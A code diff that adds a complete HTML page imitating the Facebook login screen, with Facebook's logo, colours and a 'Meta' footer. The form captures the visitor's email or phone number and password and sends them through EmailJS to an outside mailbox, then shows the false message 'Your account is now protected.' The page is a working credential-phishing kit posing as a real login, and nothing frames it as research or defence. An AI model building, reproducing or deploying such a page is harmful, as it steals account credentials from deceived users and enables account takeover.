@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #f0f2f5, #e4e6eb);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 300px;
+    }
+    .login-container img {
+      width: 60px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .login-btn, .create-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .create-btn {
+      background-color: white;
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      margin-top: 10px;
+    }
+    .meta {
+      margin-top: 15px;
+      font-size: 14px;
+      color: gray;
+    }
+    .message {
+      margin-top: 10px;
+      color: green;
+      display: none;
+    }
+  </style>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your actual EmailJS public key
+    })();
+
+    function sendEmail(e) {
+      e.preventDefault();
+      
+      emailjs.sendForm('service_xuw4eys', 'template_c0462aw', e.target)
+        .then(function(response) {
+          console.log('SUCCESS!', response.status, response.text);
+          document.getElementById("message").style.display = "block";
+        }, function(error) {
+          console.log('FAILED...', error);
+        });
+    }
+  </script>
+</head>
+<body>
+  <div class="login-container">
+    <form id="login-form" onsubmit="sendEmail(event)">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+      <h3>Facebook Login</h3>
+      <input type="text" name="user_email" placeholder="Mobile number or email address" required>
+      <input type="password" name="user_password" placeholder="Password" required>
+      <button type="submit" class="login-btn">Log in</button>
+      <p><a href="#">Forgotten password?</a></p>
+      <button type="button" class="create-btn">Create new account</button>
+      <p class="meta">Meta</p>
+      <p id="message" class="message">Your account is now protected.</p>
+    </form>
+  </div>
+</body>
+</html>
